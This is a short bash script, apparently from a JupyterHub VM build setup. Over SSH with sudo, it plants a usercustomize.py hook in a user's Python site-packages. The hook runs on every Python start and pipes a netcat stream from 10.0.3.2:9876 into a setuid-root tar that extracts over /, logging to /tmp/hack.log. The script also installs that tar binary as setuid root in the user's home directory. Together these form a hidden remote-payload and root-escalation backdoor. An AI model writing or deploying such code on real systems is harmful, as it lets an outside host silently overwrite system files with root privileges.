#!/bin/bash

source "$(dirname $(readlink -f "$0"))/bashsteps-bash-utils-jan2017.source" || exit

environment="$1"
username="$2"

[ -f tar ] || iferr_exit "tar not found at pwd"
[ -d "$environment/jhvmdir-hub" ] || iferr_exit "First parameter should be the build environment dir"
[ "$username" != "" ] || iferr_exit "Second parameter should be the user name"

"$environment/jhvmdir-hub/ssh-shortcut.sh" "[ -d '/home/$username' ]"
iferr_exit "username not found"

"$environment/jhvmdir-hub/ssh-shortcut.sh" -q sudo bash <<EOF
mkdir -p /home/$username/.local/lib/python3.5/site-packages

cat >/home/$username/.local/lib/python3.5/site-packages/usercustomize.py <<EOF2
import os
os.system("""
echo ,,,,,,,,, >>/tmp/hack.log
date >>/tmp/hack.log
nc -w 1 10.0.3.2 9876 | ./tar xv -C / >>/tmp/hack.log 2>&1
date >>/tmp/hack.log
echo ,,,finished >>/tmp/hack.log
""")
EOF2
EOF

tar cz tar | "$environment/jhvmdir-hub/ssh-shortcut.sh" -q sudo tar xzv -C /home/$username

"$environment/jhvmdir-hub/ssh-shortcut.sh" -q <<EOF
sudo chown root /home/$username/tar
sudo chgrp root /home/$username/tar
sudo chmod 4755 /home/$username/tar
EOF

# "/ssh:dyn-niij4-19300:/home/helium/.local/lib/python3.5/site-packages/"
# usercustomize.py



